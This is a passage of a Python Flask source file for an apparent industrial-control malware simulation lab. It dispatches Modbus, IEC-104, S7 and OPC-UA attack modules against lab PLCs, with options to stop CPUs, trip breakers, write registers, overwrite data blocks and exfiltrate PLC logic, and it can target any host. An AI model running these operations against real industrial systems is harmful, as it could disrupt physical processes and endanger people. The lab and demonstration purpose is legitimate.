"""
mrhOTshOT - Malware Simulation Demo UI
Flask web app for PM/executive demonstrations.
Runs on the Kali attacker VM, accessible from any browser on the network.
"""

import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime

from flask import Flask, Response, abort, jsonify, render_template, request

import scenario_loader            # per-scenario YAML manifests -> the attack catalog
import watch_process as wp  # live process readers for the "Watch" view

app = Flask(__name__)

# Agent (Beta): OpenAI-compatible LLM assistant. Isolated in a blueprint so a
# missing dep or import error can never take down the core dashboard.
try:
    from agent_llm import agent_bp
    app.register_blueprint(agent_bp)
except Exception as _agent_err:  # noqa: BLE001 - Beta feature must fail open
    print("[agent] Beta assistant disabled: %s" % _agent_err)


# Cache-busting: append each static file's mtime as ?v=<mtime> so browsers always
# fetch the current app.js / app.css / agent.js / viz after an edit (no stale cache).
# Overrides url_for('static', ...) in templates transparently - no template changes.
@app.context_processor
def _static_cache_bust():
    from flask import url_for

    def versioned(endpoint, **values):
        if endpoint == "static" and values.get("filename"):
            try:
                fp = os.path.join(app.static_folder, values["filename"])
                values["v"] = int(os.stat(fp).st_mtime)
            except OSError:
                pass
        return url_for(endpoint, **values)

    return {"url_for": versioned}

SIM_DIR      = os.path.abspath(os.path.join(os.path.dirname(__file__), "../perform_malware_simulations"))
sys.path.insert(0, SIM_DIR)  # so we can import the shared target registry (common.targets)
DEMO_DIR     = os.path.abspath(os.path.dirname(__file__))
ATTACKER_SCRIPTS = os.path.abspath(os.path.join(os.path.dirname(__file__), "../machines/attacker/scripts"))

LOG_DIR  = os.path.join(DEMO_DIR, "logs")
os.makedirs(LOG_DIR, exist_ok=True)
RESET_SCRIPT = os.path.join(DEMO_DIR, "reset_plcs.py")
# Interpreter used to launch attack subprocesses. In the console container this is
# the container's own python (set via MRHOTSHOT_PYTHON) so we never use a
# bind-mounted host .venv; otherwise prefer the repo's in-repo .venv.
# demo/ -> iec104_water_tank/ -> final_things/ -> mrhOTshOT/
_REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../.."))
PYTHON = None
for candidate in [
    os.environ.get("MRHOTSHOT_PYTHON"),     # console container: its own interpreter
    os.path.join(_REPO_ROOT, ".venv/bin/python"),
    os.path.join(_REPO_ROOT, "env/bin/python"),
    os.path.expanduser("~/v3/mrhOTshOT/env/bin/python"),
    os.path.expanduser("~/.venv/bin/python"),
    sys.executable,
    "python3",
]:
    if candidate and (candidate in ("python3", sys.executable) or os.path.exists(candidate)):
        PYTHON = candidate
        break

PIPEDREAM_SCRIPT = os.path.abspath(os.path.join(os.path.dirname(__file__),
    "../../pipedream_opcua_demo/pipedream_simulation/pipedream_simulation.py"))

# Roots a scenario manifest may reference as $PY / $SIM / $SCRIPTS / $REPO, so a
# manifest never hardcodes an absolute path. $REPO exists because pipedream's
# payload lives outside SIM_DIR (see PIPEDREAM_SCRIPT above).
SCENARIO_ROOTS = {
    "PY": PYTHON,
    "SIM": SIM_DIR,
    "SCRIPTS": ATTACKER_SCRIPTS,
    "REPO": _REPO_ROOT,
}


# IT phase scripts - malware-specific Windows artifact droppers on the HMI, run as
# Phase 0.5 between the router exploit and the OT payload. Sourced from each
# manifest's `it_phase:` key so a scenario stays one file.
IT_PHASE_SCRIPTS = {
    aid: scenario_loader.resolve_path(tok, SCENARIO_ROOTS)
    for aid, tok in scenario_loader.it_phase_map().items()
}


def viz_kinds():
    """Every visualization kind that exists on disk.

    Distinct from viz_modules(), which answers "what does THIS page load" and so
    returns only registry + generic + the one kind in use. Callers that need the
    full menu - the copilot's capability prompt, for one - must use this, or they
    will be told `generic` is the only option there is.
    """
    d = os.path.join(DEMO_DIR, "static", "js", "viz")
    return sorted(f[:-3] for f in os.listdir(d)
                  if f.endswith(".js") and f != "registry.js")


def viz_modules(kind=None):
    """Visualization modules to load on the watch page, in dependency order:
    registry.js defines registerViz(), the module self-registers into it, and
    visualizer.js (added by the template) picks one by `kind`.

    Discovered from disk, so adding demo/static/js/viz/<kind>.js is all it takes -
    no script tag to remember in watch.html.

    Only the module a page actually needs is loaded, plus generic.js as the
    fallback visualizer.js falls back to. Loading all of them meant one broken
    module - a generated one, say - would take down every watch page rather than
    its own.
    """
    d = os.path.join(DEMO_DIR, "static", "js", "viz")
    have = {f for f in os.listdir(d) if f.endswith(".js")}
    wanted = ["registry.js", "generic.js"]
    if kind and f"{kind}.js" in have and f"{kind}.js" not in wanted:
        wanted.append(f"{kind}.js")
    return [m for m in wanted if m in have]


def load_scenarios(PLC):
    """Build the attack catalog from demo/scenarios/*.yaml for a resolved PLC map.

    Same contract as the build_attacks() literal this replaced: target IPs are
    baked into each argv, so re-running it when the profile or a target IP
    changes regenerates the commands accordingly."""
    return scenario_loader.load(PLC, SCENARIO_ROOTS)

# PLC IPs - resolved from the unified target registry (common/targets.py), so
# the active MRHOTSHOT_PROFILE (esxi|docker|local) and config/targets.yaml
# overrides drive the dashboard. With no overrides this is byte-identical to the
# original static map below:
#   water .10  power .11  gas .12  mfg .13  hvac .14  boiler .15  heating .16
#   dnp3 .17   sensors .18  sis .19  historian .9  iconics .20  hmi .55  router 0.13
from common.targets import TargetRegistry, plc_map  # noqa: E402

PLC = plc_map()

ATTACKS = load_scenarios(PLC)

# Track running processes / log buffers (rebuilt set is stable across profiles)
running = {}
logs = {}
LOG_MAX = 2000   # cap in-memory log lines per attack so a long/repeat run can't grow unbounded
LOG_DIR_MAX_MB = int(os.environ.get("MRHOTSHOT_LOG_DIR_MAX_MB", "100"))   # on-disk log-dir budget
# One lock guards the check-then-set on `running` so two concurrent requests can't both start a run.
_STATE_LOCK = threading.Lock()


def _log_append(attack_id, line):
    """Append a log line and trim the in-memory buffer to the last LOG_MAX lines."""
    buf = logs[attack_id]
    buf.append(line)
    if len(buf) > LOG_MAX:
        del buf[:-LOG_MAX]


def _prune_log_dir():
    """Keep the on-disk LOG_DIR under LOG_DIR_MAX_MB by deleting the oldest .log files.
    Best-effort: a prune error must never block a run. The .log files are write-only
    (no route serves them), so this is pure disk hygiene."""
    try:
        budget = LOG_DIR_MAX_MB * 1024 * 1024
        files = []
        for fn in os.listdir(LOG_DIR):
            if fn.endswith(".log"):
                st = os.stat(os.path.join(LOG_DIR, fn))
                files.append((st.st_mtime, st.st_size, os.path.join(LOG_DIR, fn)))
        total = sum(f[1] for f in files)
        for _mtime, size, path in sorted(files):        # oldest first
            if total <= budget:
                break
            os.remove(path)
            total -= size
    except OSError:
        pass


def _init_state():
    for a in ATTACKS:
        logs.setdefault(a["id"], [])
        running.setdefault(a["id"], False)
    for pseudo in ("reset_plcs", "custom"):
        logs.setdefault(pseudo, [])
        running.setdefault(pseudo, False)


_init_state()


# ── Custom-target dispatch: send a chosen protocol at any IP:port, reusing the
# repo's existing parameterized protocol clients (all take --target/--port/--duration).
# label, default port, script (relative to SIM_DIR unless absolute), extra args.
_PIPEDREAM = os.path.abspath(os.path.join(
    SIM_DIR, "../../pipedream_opcua_demo/pipedream_simulation/pipedream_simulation.py"))
CUSTOM_PROTOCOLS = {
    "modbus":   ("Modbus TCP",          502,   "frostygoop/simulation.py", []),
    "iec104":   ("IEC 60870-5-104",     2404,  "common/direct_attack.py", []),
    "s7":       ("Siemens S7comm",      102,   "stuxnet/simulation.py", []),
    "opcua":    ("OPC-UA",              4840,  _PIPEDREAM, ["--attack", "gas_pipeline"]),
    "bacnet":   ("BACnet/IP",           47808, "bacnet_hvac/simulation.py", []),
    "dnp3":     ("DNP3",                20000, "industroyer_dnp3/simulation.py", []),
    "fins":     ("OMRON FINS",          9600,  "badomen_simulation.py", []),
    "iec61850": ("IEC 61850 / GOOSE",   8102,  "crashoverride/simulation.py", []),
    "mbus":     ("M-Bus",               5000,  "fuxnet/fuxnet_router.py", ["--no-combo"]),
    "canopen":  ("CANopen",             20001, "common/canopen_console.py", ["-m", "monitor"]),
    "ntcip":    ("NTCIP / SNMP",        161,   "common/ntcip_console.py", ["-m", "ntcip_phases"]),
}

# Suggested lab host per custom-target protocol -> the container that serves it, so the
# Custom Target form pre-fills a sensible target (the field stays editable - fire at any
# host you specify).
CUSTOM_HOST = {
    "modbus": "plc-heating", "iec104": "plc-water", "s7": "plc-centrifuge",
    "opcua": "plc-gas", "bacnet": "plc-hvac", "dnp3": "plc-dnp3",
    "fins": "plc-gas", "iec61850": "plc-power", "mbus": "plc-sensors",
    "canopen": "plc-vehicle", "ntcip": "plc-signals",
}

# ── Metasploit-style Modbus module menu ──────────────────────────────────────
# The operator picks a module ("attack") and fills its options - most importantly
# "write what where" (a value into a chosen address/coil/register). Driven by the
# self-contained raw client common/modbus_console.py. This one schema drives BOTH
# the UI field rendering and the server-side validation below.
MODBUS_CONSOLE = os.path.join(SIM_DIR, "common", "modbus_console.py")
_MB_ACTIONS = ["READ_COILS", "READ_DISCRETE_INPUTS", "READ_HOLDING_REGISTERS",
               "READ_INPUT_REGISTERS", "WRITE_COIL", "WRITE_REGISTER",
               "WRITE_COILS", "WRITE_REGISTERS", "READ_ID"]
_MB_READS = _MB_ACTIONS[:4]
_MB_ADDR = _MB_ACTIONS[:8]           # every action except READ_ID takes an address

MODBUS_MODULES = {
    "modbusclient": {
        "label": "modbusclient - read / write coils & registers",
        "fields": [
            {"name": "action", "label": "Action", "type": "select",
             "default": "READ_HOLDING_REGISTERS", "options": _MB_ACTIONS},
            {"name": "address", "label": "Address", "type": "int", "default": 0,
             "showFor": _MB_ADDR, "help": "coil / register address (0-65535)"},
            {"name": "number", "label": "Number", "type": "int", "default": 1,
             "showFor": _MB_READS, "help": "how many to read (1-125)"},
            {"name": "data", "label": "Value", "type": "int", "default": 0,
             "showFor": ["WRITE_COIL", "WRITE_REGISTER"],
             "help": "WRITE_COIL 0/1 · WRITE_REGISTER 0-65535"},
            {"name": "data_coils", "label": "Coil bits", "type": "text", "default": "",
             "showFor": ["WRITE_COILS"], "help": "binary, e.g. 0110"},
            {"name": "data_registers", "label": "Register values", "type": "text", "default": "",
             "showFor": ["WRITE_REGISTERS"], "help": "comma ints, e.g. 1,2,3,4"},
            {"name": "unit", "label": "Unit id", "type": "int", "default": 11},
        ],
    },
    "modbusdetect": {
        "label": "modbusdetect - is the target speaking Modbus?",
        "fields": [{"name": "unit", "label": "Unit id", "type": "int", "default": 1}],
    },
    "modbus_findunitid": {
        "label": "modbus_findunitid - enumerate unit ids",
        "fields": [
            {"name": "unit_from", "label": "Unit from", "type": "int", "default": 1},
            {"name": "unit_to", "label": "Unit to", "type": "int", "default": 32},
            {"name": "benice", "label": "Benice (s)", "type": "text", "default": "0.2",
             "help": "delay between probes"},
        ],
    },
    "modicon_command": {
        "label": "modicon_command - Schneider START/STOP CPU (FC 0x5A)",
        "fields": [{"name": "modicon_mode", "label": "Command", "type": "select",
                    "default": "STOP", "options": ["STOP", "RUN"]}],
    },
    "modicon_stux_transfer": {
        "label": "modicon_stux_transfer - ladder logic upload/download (FC 0x5A)",
        "fields": [
            {"name": "modicon_mode", "label": "Mode", "type": "select",
             "default": "RECV", "options": ["RECV", "SEND"]},
            {"name": "filename", "label": "File", "type": "text", "default": "modicon_ladder.apx"},
        ],
    },
}


def _mb_int(opts, name, lo, hi, default):
    try:
        v = int(opts.get(name, default))
    except (TypeError, ValueError):
        raise ValueError("%s must be an integer" % name)
    if not lo <= v <= hi:
        raise ValueError("%s out of range %d..%d" % (name, lo, hi))
    return v


def build_modbus_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate a Modbus module request and return the modbus_console.py argv.
    Raises ValueError on any bad option (this is the server-side trust boundary)."""
    if module not in MODBUS_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, MODBUS_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module == "modbusclient":
        action = opts.get("action")
        if action not in _MB_ACTIONS:
            raise ValueError("unknown action")
        cmd += ["-a", action, "--unit", str(_mb_int(opts, "unit", 0, 255, 11))]
        if action in _MB_ADDR:
            cmd += ["--address", str(_mb_int(opts, "address", 0, 0xFFFF, 0))]
        if action in _MB_READS:
            cmd += ["--number", str(_mb_int(opts, "number", 1, 125, 1))]
        elif action in ("WRITE_COIL", "WRITE_REGISTER"):
            cmd += ["--data", str(_mb_int(opts, "data", 0, 1 if action == "WRITE_COIL" else 0xFFFF, 0))]
        elif action == "WRITE_COILS":
            bits = str(opts.get("data_coils", "")).strip()
            if not bits or any(c not in "01" for c in bits):
                raise ValueError("coil bits must be a binary string, e.g. 0110")
            cmd += ["--data-coils", bits]
        elif action == "WRITE_REGISTERS":
            try:
                vals = [int(x) for x in str(opts.get("data_registers", "")).split(",") if x.strip() != ""]
            except ValueError:
                raise ValueError("register values must be comma-separated integers")
            if not vals or any(not 0 <= v <= 0xFFFF for v in vals):
                raise ValueError("register values 0..65535, e.g. 1,2,3,4")
            cmd += ["--data-registers", ",".join(str(v) for v in vals)]
    elif module == "modbusdetect":
        cmd += ["--unit", str(_mb_int(opts, "unit", 0, 255, 1))]
    elif module == "modbus_findunitid":
        lo = _mb_int(opts, "unit_from", 1, 254, 1)
        hi = _mb_int(opts, "unit_to", lo, 254, 32)
        try:
            benice = max(0.0, min(5.0, float(opts.get("benice", 0.2))))
        except (TypeError, ValueError):
            raise ValueError("benice must be a number")
        cmd += ["--unit-from", str(lo), "--unit-to", str(hi), "--benice", str(benice)]
    elif module == "modicon_command":
        m = str(opts.get("modicon_mode", "STOP")).upper()
        if m not in ("STOP", "RUN"):
            raise ValueError("command must be STOP or RUN")
        cmd += ["--modicon-mode", m]
    elif module == "modicon_stux_transfer":
        m = str(opts.get("modicon_mode", "RECV")).upper()
        if m not in ("SEND", "RECV"):
            raise ValueError("mode must be SEND or RECV")
        # sandbox the filename to LOG_DIR (user-supplied -> path-traversal guard)
        fn = os.path.basename(str(opts.get("filename") or "modicon_ladder.apx")) or "modicon_ladder.apx"
        cmd += ["--modicon-mode", m, "--filename", os.path.join(LOG_DIR, fn)]
    return cmd


# ── IEC 60870-5-104 module menu ──────────────────────────────────────────────
# No Metasploit module exists for IEC-104, so the "attacks" are the protocol's own
# control ASDUs: write-what-where = send a command/setpoint to a chosen IOA. Driven
# by common/iec104_console.py (c104-based).
IEC104_CONSOLE = os.path.join(SIM_DIR, "common", "iec104_console.py")
_IEC_CA = {"name": "ca", "label": "Common addr", "type": "int", "default": 1}
IEC104_MODULES = {
    "single_command": {
        "label": "single_command - C_SC_NA_1 single command (ON/OFF)",
        "fields": [_IEC_CA,
                   {"name": "ioa", "label": "IOA", "type": "int", "default": 302,
                    "help": "e.g. 302 = pump, 300/301 = valves, 303 = auto"},
                   {"name": "value", "label": "Value", "type": "select",
                    "default": "OFF", "options": ["ON", "OFF"]},
                   {"name": "command_mode", "label": "Mode", "type": "select", "default": "DIRECT",
                    "options": ["DIRECT", "SELECT_AND_EXECUTE"], "help": "SBO = select-before-operate"}],
    },
    "double_command": {
        "label": "double_command - C_DC_NA_1 double command (breaker trip)",
        "fields": [_IEC_CA,
                   {"name": "ioa", "label": "IOA", "type": "int", "default": 300, "help": "breaker IOA"},
                   {"name": "value", "label": "Value", "type": "select",
                    "default": "OFF", "options": ["OFF", "ON"], "help": "OFF = TRIP"},
                   {"name": "command_mode", "label": "Mode", "type": "select", "default": "DIRECT",
                    "options": ["DIRECT", "SELECT_AND_EXECUTE"], "help": "SBO = select-before-operate"}],
    },
    "setpoint": {
        "label": "setpoint - C_SE_N[A/B/C]_1 setpoint (short-float / scaled / normalized)",
        "fields": [_IEC_CA,
                   {"name": "ioa", "label": "IOA", "type": "int", "default": 400, "help": "setpoint IOA"},
                   {"name": "sp_type", "label": "Setpoint type", "type": "select",
                    "default": "shortfloat", "options": ["shortfloat", "scaled", "normalized"]},
                   {"name": "value", "label": "Value", "type": "text", "default": "75.0",
                    "help": "shortfloat: float · scaled: int16 · normalized: -1..1"}],
    },
    "regulating_step": {
        "label": "regulating_step - C_RC_NA_1 step command (raise/lower)",
        "fields": [_IEC_CA,
                   {"name": "ioa", "label": "IOA", "type": "int", "default": 305, "help": "regulator IOA"},
                   {"name": "step", "label": "Direction", "type": "select",
                    "default": "HIGHER", "options": ["HIGHER", "LOWER"]}],
    },
    "interrogation": {
        "label": "interrogation - General Interrogation + read IOA range",
        "fields": [_IEC_CA,
                   {"name": "monitor_type", "label": "Type", "type": "select",
                    "default": "measurement", "options": ["measurement", "status"]},
                   {"name": "ioa_from", "label": "IOA from", "type": "int", "default": 100},
                   {"name": "ioa_to", "label": "IOA to", "type": "int", "default": 110}],
    },
    "clock_sync": {
        "label": "clock_sync - C_CS_NA_1 clock synchronization",
        "fields": [_IEC_CA],
    },
    "counter_interrogation": {
        "label": "counter_interrogation - C_CI_NA_1 (read counters)",
        "fields": [_IEC_CA],
    },
    "test_command": {
        "label": "test_command - C_TS_TA_1 test command (link check)",
        "fields": [_IEC_CA],
    },
    "bitstring": {
        "label": "bitstring - C_BO_NA_1 32-bit bitstring output",
        "fields": [_IEC_CA,
                   {"name": "ioa", "label": "IOA", "type": "int", "default": 500, "help": "bitstring IOA"},
                   {"name": "value", "label": "Value", "type": "text", "default": "0xFFFFFFFF",
                    "help": "32-bit value (dec or 0x hex)"}],
    },
}


def build_iec104_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an IEC-104 module request and return the iec104_console.py argv."""
    if module not in IEC104_MODULES:
        raise ValueError("unknown module")
    ca = _mb_int(opts, "ca", 0, 65535, 1)
    cmd = [PYTHON, IEC104_CONSOLE, "-m", module, "-t", ip, "-p", str(port), "--ca", str(ca),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in ("single_command", "double_command"):
        v = str(opts.get("value", "OFF")).upper()
        if v not in ("ON", "OFF", "1", "0"):
            raise ValueError("value must be ON or OFF")
        cm = str(opts.get("command_mode", "DIRECT"))
        if cm not in ("DIRECT", "SELECT_AND_EXECUTE"):
            raise ValueError("command mode invalid")
        cmd += ["--ioa", str(_mb_int(opts, "ioa", 0, 0xFFFFFF, 0)), "--value", v, "--command-mode", cm]
    elif module == "setpoint":
        try:
            float(opts.get("value", "0"))
        except (TypeError, ValueError):
            raise ValueError("setpoint value must be a number")
        sp = str(opts.get("sp_type", "shortfloat"))
        if sp not in ("shortfloat", "scaled", "normalized"):
            raise ValueError("setpoint type invalid")
        cmd += ["--ioa", str(_mb_int(opts, "ioa", 0, 0xFFFFFF, 0)),
                "--value", str(opts.get("value", "0")), "--sp-type", sp]
    elif module == "regulating_step":
        step = str(opts.get("step", "HIGHER")).upper()
        if step not in ("HIGHER", "LOWER"):
            raise ValueError("step must be HIGHER or LOWER")
        cmd += ["--ioa", str(_mb_int(opts, "ioa", 0, 0xFFFFFF, 0)), "--step", step]
    elif module == "interrogation":
        lo = _mb_int(opts, "ioa_from", 0, 0xFFFFFF, 100)
        hi = _mb_int(opts, "ioa_to", lo, 0xFFFFFF, 110)
        mt = str(opts.get("monitor_type", "measurement"))
        if mt not in ("measurement", "status"):
            raise ValueError("type must be measurement or status")
        cmd += ["--ioa-from", str(lo), "--ioa-to", str(hi), "--monitor-type", mt]
    elif module == "bitstring":
        val = str(opts.get("value", "0")).strip()
        try:
            iv = int(val, 0)
        except ValueError:
            raise ValueError("bitstring value must be a 32-bit int (dec or 0x hex)")
        if not 0 <= iv <= 0xFFFFFFFF:
            raise ValueError("bitstring value out of 32-bit range")
        cmd += ["--ioa", str(_mb_int(opts, "ioa", 0, 0xFFFFFF, 500)), "--value", val]
    elif module in ("clock_sync", "counter_interrogation", "test_command"):
        pass   # CA-only commands; --ca already in the base cmd
    return cmd


# ── Siemens S7comm module menu ───────────────────────────────────────────────
# No first-class Metasploit read/write module for S7; the "attacks" are the real
# snap7 DB and CPU operations. Write-what-where = write a typed value into a chosen
# DB at an offset (Stuxnet's technique). Driven by common/s7_console.py.
S7_CONSOLE = os.path.join(SIM_DIR, "common", "s7_console.py")
_S7_CONN = [{"name": "rack", "label": "Rack", "type": "int", "default": 0},
            {"name": "slot", "label": "Slot", "type": "int", "default": 1}]
_S7_READ = ["raw", "int16", "int32", "real", "byte"]
_S7_WRITE = ["int16", "int32", "real", "byte", "bool"]
_S7_AREAS = ["DB", "M", "I", "Q"]
_S7_BLOCK_TYPES = ["OB", "DB", "FB", "FC", "SDB", "SFB", "SFC"]
S7_MODULES = {
    "cpu_info": {"label": "cpu_info - CPU state + identity (recon)", "fields": list(_S7_CONN)},
    "read_db": {
        "label": "read_db - read memory (DB / M / I / Q)",
        "fields": _S7_CONN + [
            {"name": "area", "label": "Area", "type": "select", "default": "DB", "options": _S7_AREAS},
            {"name": "db", "label": "DB", "type": "int", "default": 3,
             "showForField": "area", "showFor": ["DB"]},
            {"name": "start", "label": "Start", "type": "int", "default": 0},
            {"name": "size", "label": "Size", "type": "int", "default": 12, "help": "bytes (1-256)"},
            {"name": "dtype", "label": "Decode", "type": "select", "default": "real", "options": _S7_READ},
        ],
    },
    "write_db": {
        "label": "write_db - write a typed value into memory (write what where)",
        "fields": _S7_CONN + [
            {"name": "area", "label": "Area", "type": "select", "default": "DB", "options": _S7_AREAS},
            {"name": "db", "label": "DB", "type": "int", "default": 3,
             "showForField": "area", "showFor": ["DB"]},
            {"name": "start", "label": "Start", "type": "int", "default": 0},
            {"name": "dtype", "label": "Type", "type": "select", "default": "real", "options": _S7_WRITE},
            {"name": "value", "label": "Value", "type": "text", "default": "1410"},
            {"name": "bit", "label": "Bit", "type": "int", "default": 0,
             "showForField": "dtype", "showFor": ["bool"], "help": "bit 0-7"},
        ],
    },
    "cpu_control": {
        "label": "cpu_control - PLC STOP / START",
        "fields": _S7_CONN + [
            {"name": "cpu_mode", "label": "Command", "type": "select",
             "default": "STOP", "options": ["STOP", "COLD_START", "HOT_START"]},
        ],
    },
    "list_blocks": {
        "label": "list_blocks - enumerate program blocks (recon)",
        "fields": _S7_CONN + [
            {"name": "block_type", "label": "List numbers of", "type": "select",
             "default": "DB", "options": _S7_BLOCK_TYPES},
        ],
    },
    "block_info": {
        "label": "block_info - one block's metadata",
        "fields": _S7_CONN + [
            {"name": "block_type", "label": "Block type", "type": "select",
             "default": "DB", "options": _S7_BLOCK_TYPES},
            {"name": "number", "label": "Number", "type": "int", "default": 1},
        ],
    },
    "read_szl": {
        "label": "read_szl - system state list / identity (fingerprint)",
        "fields": _S7_CONN + [
            {"name": "szl_id", "label": "SZL id", "type": "text", "default": "0x001C",
             "help": "0x001C component, 0x0011 module, 0x0424 CPU state"},
            {"name": "index", "label": "Index", "type": "text", "default": "0x0000"},
        ],
    },
    "plc_datetime": {
        "label": "plc_datetime - read / set the PLC clock",
        "fields": _S7_CONN + [
            {"name": "dt_mode", "label": "Mode", "type": "select", "default": "get",
             "options": ["get", "set"]},
            {"name": "value", "label": "Datetime", "type": "text", "default": "2020-01-01T00:00:00",
             "showForField": "dt_mode", "showFor": ["set"], "help": "ISO 8601"},
        ],
    },
    "password": {
        "label": "password - set / clear S7 session password",
        "fields": _S7_CONN + [
            {"name": "pw_mode", "label": "Mode", "type": "select", "default": "set",
             "options": ["set", "clear"]},
            {"name": "password", "label": "Password", "type": "text", "default": "",
             "showForField": "pw_mode", "showFor": ["set"]},
        ],
    },
    "upload_block": {
        "label": "upload_block - exfil a block's MC7 bytecode",
        "fields": _S7_CONN + [
            {"name": "block_type", "label": "Block type", "type": "select",
             "default": "DB", "options": _S7_BLOCK_TYPES},
            {"name": "number", "label": "Number", "type": "int", "default": 1},
        ],
    },
    "db_fill": {
        "label": "db_fill - overwrite a whole DB (destructive)",
        "fields": _S7_CONN + [
            {"name": "db", "label": "DB", "type": "int", "default": 1},
            {"name": "fill", "label": "Fill byte", "type": "int", "default": 0, "help": "0-255"},
        ],
    },
}


def _s7_hex(s):
    """Validate an SZL id/index (decimal or 0xHEX) and return it as-is for the console."""
    s = str(s).strip()
    try:
        int(s, 16) if s.lower().startswith("0x") else int(s)
    except ValueError:
        raise ValueError("SZL id / index must be an int or 0xHEX")
    return s


def build_s7_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an S7 module request and return the s7_console.py argv."""
    if module not in S7_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, S7_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--rack", str(_mb_int(opts, "rack", 0, 7, 0)), "--slot", str(_mb_int(opts, "slot", 0, 31, 1)),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in ("read_db", "write_db"):
        area = str(opts.get("area", "DB"))
        if area not in _S7_AREAS:
            raise ValueError("area must be DB / M / I / Q")
        cmd += ["--area", area, "--db", str(_mb_int(opts, "db", 1, 65535, 3)),
                "--start", str(_mb_int(opts, "start", 0, 0xFFFF, 0))]
    if module == "read_db":
        dtype = str(opts.get("dtype", "real"))
        if dtype not in _S7_READ:
            raise ValueError("decode type invalid")
        cmd += ["--size", str(_mb_int(opts, "size", 1, 256, 12)), "--dtype", dtype]
    elif module == "write_db":
        dtype = str(opts.get("dtype", "real"))
        if dtype not in _S7_WRITE:
            raise ValueError("write type invalid")
        cmd += ["--dtype", dtype, "--value", str(opts.get("value", "0"))]
        if dtype == "bool":
            cmd += ["--bit", str(_mb_int(opts, "bit", 0, 7, 0))]
    elif module == "cpu_control":
        m = str(opts.get("cpu_mode", "STOP")).upper()
        if m not in ("STOP", "COLD_START", "HOT_START"):
            raise ValueError("command must be STOP / COLD_START / HOT_START")
        cmd += ["--cpu-mode", m]
    elif module == "list_blocks":
        bt = str(opts.get("block_type", "DB"))
        if bt not in _S7_BLOCK_TYPES:
            raise ValueError("block type invalid")
        cmd += ["--block-type", bt]
    elif module in ("block_info", "upload_block"):
        bt = str(opts.get("block_type", "DB"))
        if bt not in _S7_BLOCK_TYPES:
            raise ValueError("block type invalid")
        cmd += ["--block-type", bt, "--number", str(_mb_int(opts, "number", 0, 0xFFFF, 1))]
    elif module == "read_szl":
        cmd += ["--szl-id", _s7_hex(opts.get("szl_id", "0x001C")),
                "--index", _s7_hex(opts.get("index", "0x0000"))]
    elif module == "plc_datetime":
        m = str(opts.get("dt_mode", "get"))
        if m not in ("get", "set"):
            raise ValueError("mode must be get / set")
        cmd += ["--dt-mode", m]
        if m == "set":
            cmd += ["--value", str(opts.get("value", ""))]
    elif module == "password":
        m = str(opts.get("pw_mode", "set"))
        if m not in ("set", "clear"):
            raise ValueError("mode must be set / clear")
        cmd += ["--pw-mode", m]
        if m == "set":
            cmd += ["--password", str(opts.get("password", ""))]
    elif module == "db_fill":
        cmd += ["--db", str(_mb_int(opts, "db", 1, 65535, 1)),
                "--fill", str(_mb_int(opts, "fill", 0, 255, 0))]
    return cmd


# ── OPC-UA module menu ───────────────────────────────────────────────────────
# No Metasploit module; the "attacks" are PIPEDREAM's OPC-UA operations: browse the
# address space, then read/write process nodes. Write-what-where = write a typed value
# into a chosen NodeId. Driven by common/opcua_console.py (asyncua).
OPCUA_CONSOLE = os.path.join(SIM_DIR, "common", "opcua_console.py")
_OPC_WRITE = ["bool", "int16", "int32", "uint16", "uint32", "float", "double", "string"]
OPCUA_MODULES = {
    "browse": {
        "label": "browse - walk the address space (recon)",
        "fields": [{"name": "root", "label": "Root NodeId", "type": "text", "default": "",
                    "help": "blank = Objects"},
                   {"name": "depth", "label": "Depth", "type": "int", "default": 3}],
    },
    "read": {
        "label": "read - read a node value by NodeId",
        "fields": [{"name": "node", "label": "NodeId", "type": "text", "default": "ns=2;i=7",
                    "help": "e.g. ns=2;i=7"}],
    },
    "write": {
        "label": "write - write a typed value to a NodeId (write what where)",
        "fields": [{"name": "node", "label": "NodeId", "type": "text", "default": "ns=2;i=22",
                    "help": "e.g. ns=2;i=22"},
                   {"name": "dtype", "label": "Type", "type": "select", "default": "bool", "options": _OPC_WRITE},
                   {"name": "value", "label": "Value", "type": "text", "default": "OFF"}],
    },
    "call_method": {
        "label": "call_method - invoke an OPC-UA method",
        "fields": [{"name": "object", "label": "Object NodeId", "type": "text", "default": "",
                    "help": "parent object, e.g. ns=2;i=1"},
                   {"name": "method", "label": "Method NodeId", "type": "text", "default": "",
                    "help": "the method node"},
                   {"name": "args", "label": "Args", "type": "text", "default": "",
                    "help": "type:value;type:value (blank = none)"}],
    },
    "endpoints": {
        "label": "endpoints - list server endpoints + security policies (recon)",
        "fields": [],
    },
    "read_attributes": {
        "label": "read_attributes - node metadata (class, type, access level)",
        "fields": [{"name": "node", "label": "NodeId", "type": "text", "default": "ns=2;i=7",
                    "help": "e.g. ns=2;i=7"}],
    },
    "monitor": {
        "label": "monitor - subscribe to a node's value changes",
        "fields": [{"name": "node", "label": "NodeId", "type": "text", "default": "ns=2;i=7",
                    "help": "streams for the run time (s) set below"}],
    },
    "history_read": {
        "label": "history_read - read a node's historical values",
        "fields": [{"name": "node", "label": "NodeId", "type": "text", "default": "ns=2;i=7"},
                   {"name": "count", "label": "Count", "type": "int", "default": 10, "help": "max values 1-1000"}],
    },
}


def build_opcua_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an OPC-UA module request and return the opcua_console.py argv."""
    if module not in OPCUA_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, OPCUA_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    def _nodeid(v, what):
        v = str(v or "").strip()
        if not v or len(v) > 256 or "\n" in v:
            raise ValueError("%s required (a NodeId like ns=2;i=7)" % what)
        return v

    if module == "browse":
        root = str(opts.get("root", "")).strip()
        if len(root) > 256 or "\n" in root:
            raise ValueError("invalid root NodeId")
        cmd += ["--depth", str(_mb_int(opts, "depth", 0, 6, 3))]
        if root:
            cmd += ["--root", root]
    elif module == "call_method":
        cmd += ["--object", _nodeid(opts.get("object"), "object NodeId"),
